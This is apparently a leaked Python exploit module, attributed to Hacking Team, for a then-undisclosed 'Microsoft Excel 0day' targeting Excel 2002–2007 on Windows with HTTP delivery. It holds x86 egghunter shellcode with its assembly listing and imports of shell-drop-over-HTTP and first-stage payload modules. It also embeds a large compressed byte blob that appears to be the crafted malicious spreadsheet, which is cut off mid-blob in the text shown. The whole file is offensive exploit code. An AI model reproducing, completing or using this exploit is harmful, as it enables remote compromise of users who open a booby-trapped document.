#! /usr/bin/env python

#Copyright HT srl, 2009-2010
#http://www.hackingteam.it/ for more information

#cod

# Microsoft Excel 0day


import os
import sys
import math
import warnings

if "." not in sys.path: sys.path.append(".")
if "encoders" not in sys.path: sys.path.append("encoders")
if "payloads" not in sys.path: sys.path.append("payloads")

import time
import struct
import random
import zlib
import copy
import zipfile

import jscript_unicode
import x86shelldrophttp
import x86firststage
import x86heap
import x86int3
import ASCIIHexWhitespace
import x86helloworld

NAME='Excel 2007SP2/2003SP3/2002SP3' 
DESCRIPTION='[+] 0DAY - No details available'

DOCUMENTATION={}
DOCUMENTATION['Vendor']='Microsoft'
DOCUMENTATION['Date public']='N/A'
DOCUMENTATION['References']='http://www.microsoft.com/'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']='Excel 2007SP2/2003SP3/2002SP3'
DOCUMENTATION['CVE']='CVE-????-????'
DOCUMENTATION["CVE Url"]="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-????-????"

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP', 'VISTA', 'SEVEN']
PROPERTY['VENDOR']='Microsoft'
PROPERTY['DELIVERY']='HTTP'

NOTES="""
Tested on:
Windows XP Professional SP2/SP3/VISTA/SEVEN with Microsoft Excel XP/2003/2007
Windows Vista
Windows SEVEN
"""

CHANGELOG="""
"""

# Global payload
payload = 0

#from pyPdf.pdf import *
#from pyPdf.generic import *
#from pyPdf.filters import *

###
#START:
# OR DX, 0xFFFF
#INCREMENT:
# INC EDX
# PUSH EDX
# PUSH 2
# POP EAX
# INT 2E
# CMP AL, 5
# POP EDX
# JE START
# MOV EAX, 0x90419041
# MOV EDI, EDX
# SCASD
# JNE INCREMENT
# SCASD
# JNE INCREMENT
# JMP EDI
###

egghunter = (b"\x31\xd2"
b"\x66\x81\xca\xff\xff\x42\x83\xc2\x7c\x52\x6a\x02\x58\xcd\x2e\x3c"
b"\x05\x5a\x74\xec\xb8\x41\x90\x41\x90\x89\xd7\xaf\x75\xe8\xaf\x75"
b"\xe5\xff\xe7"
)

egghunter = (b"\x31\xd2"
b"\x66\x81\xca\xff\xff\x42\x83\xc2\x7c\x52\x6a\x02\x58\xcd\x2e\x3c"
b"\x05\x5a\x74\xec\xeb\x09\x90\x90\x90\x90\x90\x90\x90\x90\x90\xb8"
b"\x41\x90\x41\x90\x89\xd7\xaf\x75\xdd\xaf\x75\xda\xff\xe7"
)


class excel_002():
	def __init__(self, inputFile, zipFile, outputFile, dbg):
		#self.setInfo(DESCRIPTION)
		self.name=NAME
		self.debugmode = dbg
		self.outputCompressed = zipFile

		self.compressedfile = (
b"\x78\xDA\xED\x5D\x0B\x7C\x54\xC5\xB9\xFF\xCE\xD9\x4D\xB2\xD9\x6C"
b"\xC2\x26\x84\xF0\x30\x84\x25\x01\x84\x40\xE2\x3E\x92\xB0\x11\x22"
b"\xC9\x6E\x76\x01\x25\x24\x1A\x1E\x82\x51\xD8\x24\xBB\x12\x49\xB2"
b"\x21\x59\x48\x10\x23\xCB\x43\xC0\x5A\xAB\xA0\x45\xD3\x4B\x41\x6D"
b"\x69\x41\xD1\xB6\x54\x91\x6A\x29\xE1\xF6\x5E\x5B\xCB\x72\x6B\x15"
b"\x9F\x15\xC1\xAA\xA5\xBE\x03\x57\x7E\xD0\x16\x39\xF7\x3F\x73\xCE"
b"\x26\x9B\xB0\x09\x10\xB5\xEA\xED\xCE\xD9\xFF\x99\x33\xDF\x37\x67"
b"\xE6\x9B\x6F\xDE\x73\xCE\xCE\x79\xE1\x8F\x89\xC7\x1E\xFE\xC5\xB0"
b"\xB7\xA9\x87\xB9\x8A\x54\x74\x4E\x8A\xA5\xE8\x10\x9A\xA0\x80\x1B"
b"\x3D\x91\x48\x32\xCE\x49\x92\x14\x24\x4B\x11\xF3\xAD\x32\x9F\x03"
b"\x99\xC8\x37\x33\xA0\x06\xA2\x00\x96\xE7\x31\x80\x06\x88\x05\xB4"
b"\x40\x32\xA0\x03\xE2\x81\x04\x60\x80\x5C\x04\x28\x11\x48\x02\x06"
b"\x02\x2A\x60\x10\x90\x02\x0C\x06\x86\x00\x43\x81\x61\xC0\x65\x40"
b"\x2A\x30\x1C\x48\x03\x46\x00\x06\x60\xA4\x52\x7E\x32\x60\x8F\x02"
b"\x46\x03\x63\x80\xCB\x81\xB1\xC0\x38\x60\x3C\x90\x07\x4C\x00\xB2"
b"\x80\x6C\xE0\x0A\xC0\x08\x98\x00\x8B\x12\x46\x0E\xEC\x5C\x60\x22"
b"\x90\x0F\x58\x15\xFA\xB9\x48\x36\xF7\x6A\xAE\x23\x2F\x0E\x1F\xF2"
b"\xC2\x41\xF5\xB0\x1B\x69\x39\x5D\x8A\x49\x41\x89\x09\x86\xC5\xDA"
b"\x06\x83\x46\xE4\xF4\x76\x99\xED\x0C\xF5\xDB\xFE\x58\x66\xC1\xE5"
b"\xD9\x07\x85\x74\x52\x32\x17\x66\x2E\x62\x6F\xA4\xC5\x54\xC9\xE5"
b"\x58\x4C\x97\x6A\x92\x48\x14\x54\x4A\x19\x95\x42\xDA\xA1\x0B\x99"
b"\xE7\x06\xC8\xF6\x02\x9A\x43\x36\x2A\x82\x5D\x46\xD7\x51\x29\x5D"
b"\x0D\x3D\xD8\x69\x16\xDC\x76\x9A\x0D\xCA\x85\x4C\x3A\x5A\xC4\x60"
b"\xFA\x63\x7B\xF1\xD3\xF1\xE0\x60\x9E\xEE\x60\xFA\x43\x79\x76\xE8"
b"\xBC\x96\x9A\xA8\xBF\x46\x8B\xF4\xB3\xB8\x75\x97\x90\xFE\x38\x60"
b"\x4E\x41\x57\x9B\x2E\x2A\x75\xB7\xAF\xFA\x1F\x77\x11\xF5\x3F\xB9"
b"\x9F\xF5\x9F\x95\x87\xBE\xEA\x7F\xA6\xD2\x06\xF4\x56\xFF\xCD\x4A"
b"\x1B\x10\xAC\xFF\x79\x4A\x1B\x60\x55\xDA\x81\x2B\x81\x49\xC0\x64"
b"\xA0\x80\xF7\x6D\x44\x53\x94\xB6\xA1\x08\xB6\x8D\xE7\x03\x51\x31"
b"\xE0\x50\x0A\xED\x54\x60\x1A\x30\x1D\xB8\x1A\xB8\x06\x98\x01\x94"
b"\x00\x33\x81\x52\xA0\x0C\xB8\x16\x60\xA5\xA4\x1C\x98\xA5\x84\x39"
b"\x87\x97\x6B\xA2\xEB\x81\x79\xC0\x7C\xE0\x06\xA0\x02\xB8\x11\xB8"
b"\x89\x97\x3B\xA2\x85\x80\x0B\xA8\x04\xAA\x80\x6A\xC0\x0D\x78\x80"
b"\x9B\x81\x45\x40\x0D\x70\x0B\xC0\x6A\x46\x2D\x50\x07\xD4\x03\x5E"
b"\xA0\x01\x58\x02\x34\x02\xAC\x04\xF9\x80\xA5\xC0\x32\xA0\x19\x68"
b"\x01\x58\x6D\xBE\x15\x58\x01\xDC\x06\xB4\x02\xB7\x03\x2B\x01\x3F"
b"\x50\xF4\xB5\x1F\xB2\x89\x55\xF4\x5F\xF4\x0D\x39\xBE\x49\xB2\x44"
b"\x34\x14\xD1\x50\x44\x43\x11\x0D\x45\x34\x14\xD1\x50\x44\x43\x11"
b"\x0D\x45\x34\x14\xD1\x50\x44\x43\x11\x0D\x45\x34\xF4\x4D\xD0\x50"
b"\x82\xAC\x21\xFF\x37\x45\xAA\x28\xBE\x52\xE0\xA2\x26\xF2\xD1\xC8"
b"\x0B\xEA\x6B\xB3\xFB\x9F\x69\xB7\xDD\xF1\xA7\xC4\x5F\xDC\x42\xED"
b"\x1D\x63\xF3\xC6\x8E\xB4\xE7\x24\xB1\x75\x9F\xCB\x07\x13\x6D\x8F"
b"\x27\x3A\x70\x6B\xE6\x9F\xD8\x8A\x90\x35\x5D\x5E\x27\x0A\x9A\xBF"
b"\xA9\x94\xF5\xA3\x4F\x0F\x3D\xC6\x56\x8D\x1E\x9A\x3C\x5F\x15\x1D"
b"\xB2\xFE\x1F\xF4\x37\x22\x52\x8E\x22\x35\x2D\xA2\xA1\x88\x86\x22"
b"\x1A\x8A\x68\x28\xA2\xA1\x88\x86\x22\x1A\x8A\x68\x28\xA2\xA1\x88"
b"\x86\x22\x1A\x8A\x68\x28\xA2\xA1\x88\x86\x22\x1A\xFA\xB7\xD1\x50"
b"\xA8\x19\xF1\xD6\x47\xFB\x04\x8A\xA2\x5D\x37\xA5\xD1\x5F\xA7\xAC"
b"\xF1\xAC\x09\xB3\x06\xB5\x24\x86\x68\x5F\x0A\xD1\xC8\xA7\x0F\x27"
b"\xF0\x35\x28\x9D\xFC\x1E\x11\xED\x9A\xEA\xA4\xC2\xFA\xE2\xCE\xF7"
b"\x52\xBB\xAD\x41\x55\x9C\xB7\x06\x15\x34\xD1\xFC\x3D\x9D\x45\x8A"
b"\xCB\xD0\xB9\x3E\x15\xC9\x99\x88\x2C\xDF\xE6\xF6\x45\xD5\xA3\x9C"
b"\x0F\x8F\x94\xE9\x88\x2C\xFD\x28\x47\x16\xFE\xF6\x24\x29\x6F\x56"
b"\x46\xCA\x51\x44\x96\x48\x39\x8A\xC8\x12\xE9\xD7\x22\x79\xF7\xFF"
b"\xAB\x1C\xF5\x9C\x83\x9C\x6C\x19\x46\xEA\xEB\xDE\x89\xDB\x78\xCF"
b"\xFF\x24\xFE\xF0\x1D\x7A\x94\xAE\xD9\x7B\x6D\xAD\x8F\x28\x2F\x41"
b"\xFE\x87\x84\x48\x06\x79\xB2\x40\x3B\x34\xF2\xBF\x13\xF4\x7A\xD9"
b"\xBD\x28\x8A\xE8\x7F\x34\xF2\x3F\x15\x98\x97\x42\xEE\x5F\x23\x33"
b"\xD5\x3D\xFE\x3A\x07\x33\x7B\xA5\x44\xB3\x17\x3C\x0A\x64\xD2\xEC"
b"\x6D\x44\x8F\x02\xB4\x7F\x36\xCD\xDE\xFF\x28\x3D\x3A\x05\x34\x5C"
b"\xD3\x36\x11\x34\x4C\x5E\xE0\x57\x62\xFC\x29\x12\x9B\xD1\x50\x7B"
b"\x7B\x3B\x45\x4C\xC4\x44\xCC\xB7\xD7\xE8\xFF\xC5\x46\xA3\xD1\x5C"
b"\x80\xCD\xF9\x5A\xAD\xB6\x37\xB6\x46\x66\x87\xF3\xA0\x91\xF9\x5A"
b"\x6D\x78\xBE\xCC\xD6\x44\x6B\xC3\x7B\x50\xD8\xA2\xA0\x0D\xEF\x41"
b"\x13\x15\x1B\x1B\xA5\xD1\xC4\xF4\xC2\x8F\x95\x4D\x4C\x08\x3F\xD4"
b"\x83\x4E\x66\x8B\x31\x31\x14\x27\x9B\x6E\x7C\x9D\x2E\x78\x7B\x4C"
b"\x5C\x5C\xA7\x87\x10\xB6\x2E\x78\x7B\x17\x3F\x4E\x1B\xC2\xD6\xA9"
b"\x94\xDB\x85\xF3\xF9\x8C\xAD\x53\xF7\x0C\x3E\x2E\x8E\x42\xD8\x3C"
b"\x00\xB1\xDB\xED\x71\xF1\xDD\xF8\xF0\x10\x22\x3D\x63\xC7\x77\x63"
b"\x23\x8A\x90\xDB\x09\x6C\xEE\x41\x17\x62\x62\x62\xE2\xE3\xE5\x72"
b"\x17\x2F\x9B\xEE\x7C\x7D\x4C\x7C\x0F\xD3\x9D\x0D\xD3\x07\x5F\xDF"
b"\x27\x3F\xA8\xAA\xF0\xFC\x90\x8C\xEA\xC1\xD7\x77\x63\xF6\xF4\x10"
b"\xB6\x10\x5F\x88\xAF\xBF\x00\xBB\xCB\x47\x1F\x35\xE5\x02\xEC\x8B"
b"\x35\xDD\xFF\x7B\x3B\x42\x92\xCE\xA5\x4D\x91\xCE\xA6\x8E\x90\xCE"
b"\xE8\x47\x48\x1D\x34\x40\x3A\x46\x31\x1C\xED\xA4\x92\xFC\x00\x06"
b"\x2F\xE7\x80\xB3\xC0\x19\xA0\x43\xC1\x31\x8C\x28\xDA\x19\xD4\x24"
b"\xF8\x07\x00\x23\x80\x95\x7E\x61\x95\xD4\x2E\xFC\x51\x3A\x26\x48"
b"\x52\x07\x70\x46\x85\x08\x00\x69\x7D\x30\xC6\xB1\xCA\xBF\x36\x0D"
b"\x21\xE3\x94\x42\xA1\xB7\xD6\xCA\x2F\xFF\x45\xD0\xEF\x97\x2D\x76"
b"\xE0\x82\x8D\x43\xDA\xDF\x6C\xA7\x8E\x3F\xFC\x84\xD4\x6A\x35\xA1"
b"\x12\x13\xF2\x94\x12\x13\x13\x29\x25\x25\x85\x52\x53\x53\x29\x3D"
b"\x3D\x9D\xC6\x8D\x1B\x47\xB3\x67\xCF\xA6\x92\x92\x12\xB2\xD9\x6C"
b"\x94\x9F\x9F\x4F\xFE\xDB\x24\x2A\x2B\x93\xE8\x3E\x7A\x85\xA4\x8F"
b"\x02\xF4\xDC\x2B\x9F\xD2\x2B\xC7\x8F\xD3\xBD\x3B\x1F\x57\xFE\xC3"
b"\xC9\xFE\xFB\xD8\x06\x04\x64\xA7\x05\x27\x0B\x68\x16\xD0\x2C\x8C"
b"\x26\xC9\x5E\x3C\xA0\x7B\x70\xE1\x01\xDD\x03\xBA\x47\x92\x6F\x6B"
b"\x03\xBD\x0D\xF4\x36\x38\xDA\x40\x6F\x93\x78\x50\x14\x00\x3D\x00"
b"\x7A\x00\xF4\x00\x08\x01\xD0\x25\xB8\x25\xB8\xA5\x80\x1C\x15\x3F"
b"\x3C\x40\x1B\xC0\x68\x92\x1C\x3D\x4E\x16\xC8\x60\x81\x0C\x16\xC8"
b"\x60\x81\x0C\x5C\x24\xC8\x60\x81\x0C\x16\xC8\x60\x81\x0C\x16\xC8"
b"\xC0\xC5\x84\x0C\x16\xC8\x60\x81\x0C\x16\xC8\x60\x81\x0C\x5C\x74"
b"\xC8\x60\x81\x0C\x16\xC8\x60\x81\x0C\x16\xC8\x60\x91\x40\x83\x1C"
b"\x16\xC8\x61\x61\x72\x60\x9C\xC7\x93\xC7\x25\x61\x47\x1B\x10\x00"
b"\x24\x39\xC9\x90\xC5\x83\xC8\x3D\x88\xC8\x83\x40\x3D\x90\x85\xAB"
b"\x01\x4C\x0F\x2E\x3C\x90\xC5\x03\x59\xB8\x5A\x20\x87\x07\x72\x78"
b"\x20\x87\xA7\x8D\xD1\x24\x59\x55\x90\xC3\x03\x19\x3C\x90\xC1\x03"
b"\x19\x98\xEA\x3C\x90\xC3\x03\x19\x3C\x90\x21\x80\xB8\x24\x9C\xB9"
b"\x0A\x11\x8F\x7C\x04\x14\xF5\x5A\xB8\x44\x6D\x16\xE6\x96\x64\x55"
b"\x23\xEE\x36\xC8\xD4\x86\x48\xDB\x10\x41\x1B\x64\x6A\x43\xDC\x6D"
b"\x60\xB6\x21\x90\xB6\x36\x16\x96\x24\x67\x07\x8F\x1B\x74\xC4\xDF"
b"\x86\xF8\xDB\x10\x3F\xCB\xA2\x36\xC4\xDF\xC6\xE8\x90\xA1\x0D\x32"
b"\xB4\x49\x12\xCF\x36\x39\x27\x3C\x3C\x76\x26\x19\xCB\xDE\x00\x64"
b"\x08\x20\xBE\x00\x64\x0B\x40\x8E\x00\xE2\xE3\x59\xCB\xE4\x80\x0E"
b"\x02\x90\x23\xC0\xE4\x40\xC2\x78\x76\xE3\xA6\x00\x64\x09\x40\x96"
b"\x00\x84\x08\x20\x42\x5E\x04\x20\x4B\x00\x37\x06\xE0\x29\x00\x42"
b"\x00\xB2\xB0\x62\x11\x60\xB2\x20\x4F\x02\x90\x25\xC0\xF4\xC1\x65"
b"\x61\xA5\x81\xE5\x42\x1B\x2F\x4A\x12\x64\x90\x20\x83\x04\x19\x24"
b"\xC8\x20\x41\x06\x5E\x9C\x20\x43\x00\x32\x48\x90\x41\x82\x0C\x01"
b"\xC8\xC0\x8B\x18\x64\x90\x20\x83\x04\x19\x24\xC8\x20\x41\x06\x04"
b"\x0D\x80\x0E\x19\x24\xC8\x20\x41\x06\x29\xC0\xC6\xFA\x08\x03\x81"
b"\x49\xB8\x51\x82\x27\x8F\x87\xE5\x11\xF2\x51\x62\x71\xB0\xB0\x99"
b"\x1F\x0F\x8D\xA4\xED\xB4\x60\xC1\x02\x6A\x6E\x6E\xA6\x75\xEB\xD6"
b"\xD1\xE6\xCD\x9B\xE9\xE0\xC1\x83\xB4\x7B\xF7\x6E\x7A\xF5\xD5\x57"
b"\xE9\xC8\x91\x23\xF4\xCE\x3B\xEF\xD0\x07\x1F\x7C\x40\x27\x4E\x9C"
b"\xA0\x33\x67\xCE\x50\xC7\x3F\x25\xFA\xF1\x43\x0F\xA1\x1E\xB3\x1A"
b"\x2D\xF1\x1F\xB1\x70\xB9\x8B\x85\xCB\xDF\xE0\xED\x75\xFC\xF2\x40"
b"\x0F\xE7\x03\x0F\x90\xD5\x1A\xEA\x7C\xC0\xDA\xE5\x66\xCE\x75\xD6"
b"\x2E\x42\x56\x56\xD6\x3A\xEE\x96\x09\x2F\x31\xF7\x04\x18\xD9\xFD"
b"\xD2\x4B\x8C\x3D\x81\x13\xB8\x93\xB9\xEB\xB9\x7B\x0C\x77\x82\x20"
b"\xB3\xC7\x04\xDD\x34\x46\x31\xB2\x9B\xFD\x73\xBC\xCB\x2D\xC7\x19"
b"\x74\x77\x9A\x9E\x6E\x46\x39\x3F\x9D\x5C\x0F\x2B\x89\xCE\x5D\x4E"
b"\x74\x36\x86\xE8\x0C\xA6\x90\x67\xD0\x4E\x76\x00\xC7\x80\x76\xC0"
b"\x0F\xAC\x06\xD6\x03\xDB\x56\xC1\xFF\x01\xE0\x7F\xE5\x7B\xBF\x3D"
b"\x26\x56\x83\xFE\x20\x3A\x8A\xD6\x1A\x0E\xC5\x1C\x40\x97\x12\x8D"
b"\x94\xBE\x8D\x19\xEF\xCF\xD5\x07\xF8\xFB\xDE\x7F\xE1\xFF\x5B\x6F"
b"\x60\xFB\x01\x2C\xAD\x5F\x5C\xEF\x6D\xAE\x37\xFC\x4B\x8C\x8D\xCB"
b"\xE0\x12\x98\x0C\x4C\xDB\x05\x42\x34\x9F\x89\xAB\x88\xE5\x2C\xA6"
b"\xED\xB4\x05\xAE\x04\x1A\xCA\xA5\x4C\xE2\xE7\x81\xFC\xFC\x33\x7E"
b"\xCF\xAF\xF9\xB9\x00\x9C\x0E\x9A\x4F\x7F\x1E\x15\x35\xD4\xAA\x4C"
b"\xC4\xAF\x17\x0B\xB9\xBF\xBB\xF9\x39\x9D\x9F\x13\x70\x16\xE8\x69"
b"\x7E\xCF\x1B\x9C\x62\xA2\x61\xF4\x7B\x56\x12\x56\xDE\x2B\xF7\x8F"
b"\x52\x94\x50\x44\x8D\x54\x43\x2E\xAA\xFD\x0A\xB9\x69\x6A\x0B\x45"
b"\xD1\x60\x12\x32\x68\x02\x65\xE0\x30\x42\xFD\x06\x88\xB9\xCB\x90"
b"\x4E\x93\x70\x9D\x45\xE1\x38\x69\xEA\x02\x8A\xA6\xD4\xDE\x6E\xBB"
b"\x81\xAE\x23\x37\x55\xD3\x8D\x7D\x04\x30\x05\x79\x3C\x3C\x34\x80"
b"\x6C\xA0\xAF\xD8\x7B\xF2\xD3\xD4\xD3\x31\xA4\x48\xEF\x3B\x88\xDE"
b"\x24\x39\x3F\xB0\x25\x94\x49\x79\x24\x2C\x80\xB7\x4C\x90\xC3\x09"
b"\xCD\x78\xB2\x54\x7D\xFB\x08\x86\x91\x0E\x3B\x3D\x2C\xB7\x90\x9F"
b"\xD3\xD4\x8B\x69\x1C\x9A\xFA\x5E\x22\x5D\x80\x9B\xFA\x8A\xB2\x8B"
b"\x7F\x7E\x84\xDD\x79\xC1\xE8\x56\xE1\xFE\xAB\xC2\x45\xD7\x53\x1D"
b"\xBD\x45\x1B\xDE\x5F\xF7\xE8\xA7\xE0\xE8\x2B\xCD\x2B\x68\x3C\x28"
b"\x7D\x0A\xD1\x57\xCA\xC3\xF9\x0A\x2F\x40\x38\x1D\x1C\xE3\xBB\x86"
b"\x10\x9D\x92\x0C\xA1\x3B\xC5\x18\x18\x5D\x08\xD2\x3F\xBB\x38\xBA"
b"\x78\x89\x74\xFA\x37\xA4\x0B\x14\x4E\xCF\xE3\x65\xFF\x67\x7A\xD2"
b"\xC7\xF5\x42\x9F\xD0\x0B\x3D\xB3\x17\x7A\xEC\x79\xF4\xFB\x44\x35"
b"\xE9\xFD\x2A\x89\xD9\x89\xFE\x68\x6E\x27\xF9\xD5\xDC\x1E\xE8\x8F"
b"\xE1\x36\x26\x1C\xDC\x4E\xF6\x47\x49\x0B\x79\xDB\x7C\x07\xFB\xB7"
b"\x95\x56\x7E\x97\xA3\x7C\x91\xDB\xED\x33\x31\xCA\xDE\xF8\x10\x8A"
b"\x99\x51\xF6\x27\x84\x50\x2C\xDF\x25\x4C\x93\x30\x5E\x3A\x20\x68"
b"\x00\xB4\xF9\xBF\x11\xE8\x43\x7A\x59\x1C\x80\x0E\xFD\x10\xFF\x53"
b"\x53\x74\x07\xDB\xAB\x46\xA5\xEE\xDA\x0B\x27\xB8\xD7\x99\x8A\xBF"
b"\x23\x22\x74\x34\x89\xAC\xAF\x88\xE9\x58\x0C\x5B\x54\x2F\x1B\x3B"
b"\xE1\xC9\x8D\x71\x3F\xDB\x95\x7A\xD9\xF6\xBB\x3D\x7F\x9D\x96\x25"
b"\xD1\x54\xB1\xFB\xFF\xA3\x0A\x0B\x86\x75\x4C\x01\xA1\xA7\xCF\xD7"
b"\xA2\xBA\xFC\x4C\x57\xF0\xF2\xAD\x5A\x4A\x5D\xA9\xA5\x78\xBE\x99"
b"\x5A\xCB\x1B\x8F\xCF\x3A\x70\xF5\x0D\xD7\xEA\x0B\x9A\xDF\x6A\x5D"
b"\x3E\xFD\xBB\xD7\xD6\xE8\x0F\xE8\xE7\x3F\x9C\x39\x6B\xE4\x8E\xE4"
b"\x0A\xCD\x77\xEA\xEA\x76\xC6\xCF\xDB\x30\xE2\x85\xFA\xCF\x37\x4C"
b"\x1D\x7C\x7B\xF1\xFE\x76\x47\xCA\xBC\xBD\xA7\x06\x8C\xFA\xB0\xFE"
b"\xD9\x81\x6F\xEE\xDD\xF3\xF2\xF1\x40\xAB\xE5\xAF\xFB\x36\x3F\x59"
b"\x96\x3A\xE4\xE8\x9B\x6D\x4D\xC7\xB7\xFC\xEA\xB4\x33\xE6\x98\xBA"
b"\x6A\x52\xD9\xC4\x67\x9F\x78\xEF\xDC\xD9\x8F\x7F\xDA\xEC\xFF\xED"
b"\xE9\x21\xAF\x1D\xBB\x6D\xED\xEE\xE1\xBF\x5B\x7E\x72\xBD\xEA\x07"
b"\x4F\x54\x3C\x7B\xE5\x4C\xE3\x47\x2D\x0D\xAA\x2D\x89\x1D\x77\x7F"
b"\x7E\xEC\xD0\xFA\xD6\x75\xDB\x77\x1F\x3F\xF8\xFC\x1F\x33\x0E\xB4"
b"\x8E\x76\x2D\xDC\xBD\xE8\x9E\x6B\xD2\x9A\x5C\x4F\x9F\xBD\xF1\x89"
b"\xC0\x42\x61\xE8\x65\xC6\xBB\x1E\x8E\x79\xA6\x79\xDE\xB2\x79\x51"
b"\x09\x43\xE7\x95\x17\xE7\x1A\xF6\xC6\x56\x9D\x0C\xDC\xF6\xFB\x96"
b"\x9C\x25\x87\x3F\x3C\x3D\x70\x4B\xEB\x5B\xEF\x7B\x7F\xF7\xD3\x1D"
b"\x8B\xF7\xA5\x9D\xA4\xB7\xC7\x64\x36\x6F\xFC\xBB\x27\xE7\x25\xED"
b"\xD8\x7B\xA2\xAB\x8D\x97\xCD\x8C\xDE\xFA\xC8\x27\x47\x5E\xB8\xE6"
b"\xF0\x43\x7B\xBC\x2B\xDE\x5F\x72\xCD\x92\x1D\x77\xBD\x36\x7A\xAB"
b"\x78\xFD\xF1\xAC\xD8\x95\x2B\x37\x7E\x7C\xE8\x97\xAE\x39\xCF\xCD"
b"\x7D\xD0\x32\x64\xE8\xD6\xE4\x11\xCF\xDC\xFB\xF6\x8F\xDA\xE7\x65"
b"\x3C\x3F\xFD\xB9\x67\xDF\xF7\xDF\xF0\xD9\xFA\x4F\x76\xDF\x72\xF5"
b"\xDE\xEF\x95\x98\x6F\xAA\xDA\xF4\x69\xFC\xE9\x43\xFB\xAF\xDD\xBB"
b"\x7F\xE6\x6B\x05\x9F\x3E\xDD\xB0\xF5\xB3\x4F\xA6\xFE\x62\xE7\xEB"
b"\x83\x4E\xBD\x59\xB5\xCB\xF9\x8F\x3D\xD3\x8C\x49\x05\x3F\xCA\xD5"
b"\x6D\xDA\x6F\xDA\x65\xCD\x3F\xD5\xF8\xB9\x34\x24\xE6\x4E\xD3\xF7"
b"\xFE\xB2\xD2\x74\x6E\xF9\x02\xC7\xF8\xA3\x3F\x5B\xF1\xEB\x3B\x76"
b"\xDB\x56\x2C\xD9\x3D\xB7\xDE\x7D\xF5\x82\x97\x56\x9C\x7A\xC3\xFB"
b"\xE1\x33\x4F\x7C\x5C\x32\x7F\xDF\xC7\x4D\x2B\xF3\x3F\xF9\xFE\xFC"
b"\xC0\xC0\xED\x07\x57\xFF\xE9\xD5\x59\xD7\x66\xE7\x9A\xB7\x1C\x9E"
b"\xF3\xDA\xE0\x51\x3B\x1D\xAD\xC7\xEE\x69\x9D\xFE\x61\xFC\xE3\x4F"
b"\xE5\x6C\xF5\xAC\xDC\x9E\xFB\xD2\xB2\x03\xA3\x26\x3D\xE1\x3F\x3E"
b"\x70\xDB\x8F\xBD\x4F\x3D\xE4\x7A\xAA\xFD\x94\xED\xA9\x65\x4F\x9E"
b"\xDE\x70\x60\xDF\x3F\x27\x4C\x3A\x7E\xD7\x91\x4D\x03\x5F\xF9\xD5"
b"\xB4\xE3\x6F\xE4\x1E\x89\xCA\xDE\x99\xF5\x41\xFE\xEB\xE7\x5E\x7D"
b"\x26\xAD\x61\x5B\xEE\x8C\xAB\x9E\x7E\x64\xF3\xF6\x13\x6F\xBE\x3E"
b"\xEA\x6C\xF9\x87\x83\x5A\x1D\xFB\x5E\xFC\x74\xDC\xA9\xF9\x5B\x92"
b"\x2B\xF7\x3C\xF9\x98\x69\xFF\x89\xCF\x7E\xD4\xF8\xE7\x95\x0F\xFF"
b"\xE4\xEC\x1C\x5F\xC1\x63\x27\x54\x47\x93\x7F\xD2\x62\xA1\xB8\x0E"
b"\xB6\xBD\xD2\x7E\xF4\xAC\x1A\x5A\x85\x81\x02\x69\xDA\x85\x42\x9C"
b"\x0B\x29\xED\x84\x5E\xDE\x90\x49\xA3\x03\x06\x03\xA7\x31\xBB\x3F"
b"\x1B\x7C\xFC\xC0\x87\xF4\x22\x5C\x55\x9A\x41\x40\x57\xB1\x1B\xA4"
b"\xD8\xA2\xB6\x73\xFC\xA7\xEF\x36\xFE\x8B\x13\xF5\xDD\xC6\x88\x7B"
b"\xB5\x2C\x1A\x36\x42\xD2\xE1\x5C\x4D\x03\xF8\x75\x22\x2F\xEF\x7A"
b"\x44\x70\x76\xE7\x89\x17\x4B\x2A\xCB\xA6\x2C\xE0\xF4\x4C\x4E\x1F"
b"\xCF\xCF\xAB\x39\xC5\x1F\x22\xD2\x68\x56\xAF\x21\xD8\x2A\x70\x0E"
b"\xA8\x83\x3B\x46\xAD\xE1\xBE\xD7\xF2\xF3\xC3\x7C\x3F\x28\x09\xF7"
b"\xB1\x43\xDD\x29\x2E\x46\xDE\x53\x82\xB6\x40\xB3\x79\xD2\x48\x4C"
b"\xE8\x31\x9E\xFD\x88\xFE\xC0\xE4\xEB\xB8\x52\xE0\xB2\x75\x68\x94"
b"\x3A\xCC\xA2\x1D\x40\xAA\x8E\x74\x81\xD9\xEA\x8E\xB1\xBC\x7E\xC7"
b"\x76\xE8\xC3\x8C\x89\x45\xD2\xF2\xFB\xD8\x13\x9C\x28\x92\xFD\xB3"
b"\x3D\x96\x36\xE9\x64\xBA\x00\xBA\x5E\xCB\xF6\x6C\x8A\xEB\xB0\x76"
b"\x66\x8E\xBA\x88\xB5\x17\x71\x82\xC0\x47\xAC\x2C\x8B\xD8\x86\x68"
b"\x1A\xF2\xFF\x36\x99\xEF\x0D\xE5\xA2\x4A\x2A\xE7\x3B\xAC\xD5\x60"
b"\x3C\x6D\x92\xD7\x83\x79\xE6\xF2\x76\x03\x8D\x4F\x0B\x8B\x50\xD0"
b"\xF1\x7D\xAA\x12\x3B\x88\xEF\x16\xF5\x28\xD2\x9F\x84\x50\xA0\x6F"
b"\xDE\x70\x5F\x3F\xFA\x45\x3E\x6A\x8C\xC1\x5D\x4C\x03\x22\xFA\xDE"
b"\x58\x68\x78\x0C\x7B\x97\x6E\x50\xAE\x20\x16\x1F\xDE\x41\xAA\x14"
b"\xA2\x92\x72\xBB\xB7\xAE\xCA\x57\x3B\xA3\xA6\x32\x7B\x96\xAB\xB2"
b"\xDC\xD7\x58\xD3\x90\x6D\xE6\xB1\xAE\x4D\x97\xF7\xB6\xCA\xC7\x50"
b"\x27\x8F\xAC\x64\xC6\x39\x97\x1C\xE8\x8D\xAD\xB0\x9D\xFC\xCA\x84"
b"\xA3\x1A\x60\x34\x1B\x28\x16\x5C\x19\x95\xC3\x09\xDA\x44\xF8\xCC"
b"\xA1\x62\x2A\x52\x52\x22\xEB\xBE\x85\xEB\xAA\x21\x44\x57\x62\x88"
b"\xAE\xF2\x2E\x42\x57\x49\x5C\x57\x6C\x2F\xB8\x5A\xE8\xCB\x05\x6D"
b"\x75\xD7\x54\x14\xDD\x8B\xD2\xB9\x01\x6D\xBB\x5E\x35\x9C\xEF\x70"
b"\x15\xD4\xD4\x0E\x45\x53\xA2\xA2\x29\x7F\x66\x38\x4D\xDD\x4E\xA3"
b"\x10\x86\x2E\x05\x9A\x32\x3E\x0F\x4D\x0D\xEA\xA1\x29\xAF\xB7\xB6"
